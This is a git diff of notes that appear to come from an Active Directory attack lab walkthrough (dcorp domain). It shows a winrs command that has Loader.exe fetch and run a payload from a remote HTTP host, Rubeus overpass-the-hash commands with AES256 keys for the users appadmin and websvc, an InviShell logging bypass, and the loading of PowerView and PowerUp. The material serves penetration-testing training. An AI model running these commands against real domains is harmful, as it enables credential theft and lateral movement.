@@ -55,17 +55,19 @@ $null | winrs -r:dcorp-appsrv "cmd /c C:\Users\Public\Loader.exe -path http://12
 Note down the `aes256_hmac` and the cleartext credentials 
 Use Rubues on attacking machine
 ```powershell
-C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgt /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
 This will create a logon type 9 so the new credentials will only be used when accessing domain resources
 
 ```powershell
+net use A: \\TSCLIENT\Tools
+
 A:\tools\InviShell\RunWithRegistryNonAdmin.bat
 ```
 
 ```powershell
-Import-Module .\PowerView.ps1, .\PowerHuntShares.psm1, .\Find-PSRemotingLocalAdminAccess.ps1, .\PowerUp.ps1
+cd C:\Users\Public; Import-Module .\PowerView.ps1, .\PowerHuntShares.psm1, .\Find-PSRemotingLocalAdminAccess.ps1, .\PowerUp.ps1
 ```
 
 You must have administrator access to list sessions - netexec equivalent
